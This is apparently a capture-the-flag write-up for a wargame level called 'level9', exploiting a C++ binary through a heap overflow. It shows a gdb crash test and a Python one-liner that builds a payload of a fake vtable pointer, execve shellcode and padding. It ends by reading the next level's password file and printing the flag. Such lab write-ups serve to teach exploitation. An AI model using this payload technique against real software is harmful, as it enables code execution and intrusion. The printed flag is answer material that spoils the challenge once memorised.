# Level9

No calls to /bin/sh and no direct access to .pass, we can assume we will have to use shellcode this time	
`operator new` is called twice. This will allocate memory for an object		
The program takes a single argument, that is placed into the first object instance with `strlen()` and `memcpy()`	
A `call` later in the program uses the address stored at the start of the second object instance as parameter		

Lets try and see if we can overflow on the heap using the `strcpy()`
```
gdb level9
r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
```

The segfault occurs after 108 characters, and occurs because the program interprets the begining of the second object instance as a pointer to executable code
To spawn a shell we will have to include pointers that redirect to our shellcode so that the instructions before the `call` do not crash

```
python -c "print '\x08\x04\xa0\x10'[::-1] + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 83 * 'A' + '\x08\x04\xa0\x0c'[::-1]" > /tmp/inj9
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
